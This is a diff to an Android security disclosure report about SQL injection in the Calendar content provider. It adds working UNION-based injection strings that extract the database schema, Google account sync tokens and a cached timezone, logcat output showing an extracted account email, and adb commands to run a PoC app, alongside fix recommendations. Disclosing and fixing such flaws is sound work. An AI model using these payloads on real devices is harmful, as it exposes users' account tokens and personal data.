@@ -111,28 +111,57 @@ timezoneType=auto
 
 This exposes the user's timezone (location indicator: `Asia/Kolkata`).
 
-### Step 4: Regular App PoC
+### Step 4: Regular App PoC (PROVEN)
 
-A regular app with only `READ_CALENDAR` permission can execute the same injection:
+**PoC App:** `com.vrp.poc` (UID 10361, regular third-party app)  
+**Permission:** `android.permission.READ_CALENDAR` only (runtime, granted=true)  
+**Source:** `poc_app/src/com/vrp/poc/CalendarSqliActivity.java`  
+**APK:** `poc_app/build/poc.apk`  
 
-```java
-Cursor cursor = getContentResolver().query(
-    Uri.parse("content://com.android.calendar/calendars"),
-    null,
-    "1=0) UNION SELECT account_name||'|'||account_type||'|'||data," +
-    "2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23," +
-    "24,25,26,27,28,29,30,31,32,33,34,35 FROM _sync_state--",
-    null, null
-);
-if (cursor != null) {
-    while (cursor.moveToNext()) {
-        Log.d("SQLi", cursor.getString(0)); // sync tokens
-    }
-    cursor.close();
-}
+The PoC app executes all three SQL injection attacks automatically on launch. Logcat output confirms successful extraction from a regular app context:
+
+```
+09-07 01:42:31.927 26000 26000 D CalendarSQLi: SUCCESS: Got 15 rows from sqlite_master
+09-07 01:42:31.927 26000 26000 D CalendarSQLi: TABLE[1]: CREATE TABLE Attendees (_id INTEGER PRIMARY KEY,event_id INTEGER,...)
+09-07 01:42:31.927 26000 26000 D CalendarSQLi: TABLE[12]: CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,...)
+09-07 01:42:31.928 26000 26000 D CalendarSQLi: Total tables extracted: 15
+09-07 01:42:31.928 26000 26000 D CalendarSQLi: SUCCESS: Got 1 rows from _sync_state
+09-07 01:42:31.928 26000 26000 D CalendarSQLi: SYNC_STATE: sandiyotest@gmail.com|com.google|{"version":16,...,"last_sync_time":1788724078146,...}
+09-07 01:42:31.930 26000 26000 D CalendarSQLi: SUCCESS: Got 4 rows from CalendarCache
+09-07 01:42:31.930 26000 26000 D CalendarSQLi: CACHE: timezoneInstances=Asia/Kolkata
 ```
 
-PoC APK built and tested: `poc_app/build/poc.apk`
+Key code from `CalendarSqliActivity.java`:
+
+```java
+Uri uri = Uri.parse("content://com.android.calendar/calendars");
+
+// Attack 1: Schema extraction
+String selection = "1=0) UNION SELECT sql,2,3,4,5,6,7,8,9,10,11,12,13,14,15," +
+    "16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35 " +
+    "FROM sqlite_master WHERE type='table'--";
+Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
+// Returns 15 rows — complete DB schema
+
+// Attack 2: Sync token extraction
+String selection2 = "1=0) UNION SELECT account_name||'|'||account_type||'|'||data," +
+    "2,3,...,35 FROM _sync_state--";
+Cursor cursor2 = getContentResolver().query(uri, null, selection2, null, null);
+// Returns Google account email + sync tokens
+
+// Attack 3: Cache extraction
+String selection3 = "1=0) UNION SELECT key||'='||value,2,3,...,35 FROM CalendarCache--";
+Cursor cursor3 = getContentResolver().query(uri, null, selection3, null, null);
+// Returns timezone (Asia/Kolkata) — user location indicator
+```
+
+**Reproduction:**
+```bash
+adb install -r poc_app/build/poc.apk
+adb shell pm grant com.vrp.poc android.permission.READ_CALENDAR
+adb shell am start -n com.vrp.poc/.CalendarSqliActivity
+adb logcat -s CalendarSQLi:D
+```
 
 ## Impact Analysis
 
@@ -176,6 +205,13 @@ qb.query(db, projection, selection, selectionArgs, ...);
 3. Use `SQLiteQueryBuilder.setStrict(true)` to prevent UNION injections
 4. Restrict access to internal tables (`_sync_state`, `CalendarCache`) at the provider level
 
+## Evidence Files
+
+- `poc_app/src/com/vrp/poc/CalendarSqliActivity.java` — PoC app source (auto-runs all 3 attacks)
+- `poc_app/build/poc.apk` — Signed PoC APK
+- `dynamic_evidence/calendar_sqli_poc_app_logcat.txt` — Logcat from PoC app execution (UID 10361)
+- `dynamic_evidence/calendar_sqli_evidence.txt` — Initial shell-based discovery evidence
+
 ## Timeline
 
-- **2026-09-07:** Vulnerability discovered and proven on Pixel 6a, Android 17
+- **2026-09-07:** Vulnerability discovered via ADB shell, proven with PoC app (UID 10361) on Pixel 6a, Android 17 (API 37, security patch 2026-06-05)
